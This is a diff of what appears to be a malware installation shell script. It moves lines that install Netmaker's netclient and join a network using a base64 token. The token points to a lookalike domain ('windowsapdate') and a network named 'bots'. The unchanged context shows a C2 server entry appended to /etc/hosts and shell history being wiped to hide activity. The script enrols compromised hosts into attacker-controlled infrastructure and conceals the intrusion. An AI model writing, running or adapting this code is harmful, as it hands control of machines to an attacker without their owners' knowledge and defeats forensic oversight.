@@ -2,14 +2,6 @@
 apt=`which apt-get`
 if [[ -f $apt ]]; then
 apt-get -qq -y update >/dev/null 2>&1
-curl -sL 'https://apt.netmaker.org/gpg.key' | sudo tee /etc/apt/trusted.gpg.d/netclient.asc
-curl -sL 'https://apt.netmaker.org/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/netclient.list
-apt update
-apt install netclient -yum -qq -y >/dev/null 2>&1
-sleep 3
-netclient join -t eyJhcGljb25uc3RyaW5nIjoiYXBpLmRlcGxveS53aW5kb3dzYXBkYXRlLmNvbTo0NDMiLCJuZXR3b3JrIjoiYm90cyIsImtleSI6ImE1ZTRjM2QxNzczZTExM2YiLCJsb2NhbHJhbmdlIjoiIn0=
-sleep 3
-ping -c 3 10.10.20.1
 apt-get -qq install cron -y ; apt-get -qq install net-tools -y ; apt-get -qq install systemd -y ; apt-get -qq install socat -y
 which crontab;which netstat;which systemd;which socat
 echo -e "\e[31mInstalled with apt-get\e[0m"
@@ -18,8 +10,15 @@ yum -q update -y
 yum -q install systemd -y ; yum -q install cron -y;yum -q install net-tools -y;yum -q install socat -y
 which crontab;which netstat;which systemd;which socat
 echo -e "\e[31mInstalled with yum\e[0m"
+curl -sL 'https://apt.netmaker.org/gpg.key' | sudo tee /etc/apt/trusted.gpg.d/netclient.asc
+curl -sL 'https://apt.netmaker.org/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/netclient.list
+apt update
+apt install netclient
+sleep 3
+netclient join -t eyJhcGljb25uc3RyaW5nIjoiYXBpLmRlcGxveS53aW5kb3dzYXBkYXRlLmNvbTo0NDMiLCJuZXR3b3JrIjoiYm90cyIsImtleSI6ImE1ZTRjM2QxNzczZTExM2YiLCJsb2NhbHJhbmdlIjoiIn0=
+ping -c 3 10.10.20.1
 fi
-sleep 5s
+sleep 3s
 if [ -z "${HOME:-}" ]; then export HOME="$(cd ~ && pwd)"; fi
 uid=$(id -u)
 if [ -n "${uid}" ] && [ $uid -ge "0" ] ; then
@@ -127,3 +126,13 @@ echo -e "$c2serverip $c2servername" >> /etc/hosts
  echo $status
 
 unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c
+
+
+
+
+
+
+
+
+
+
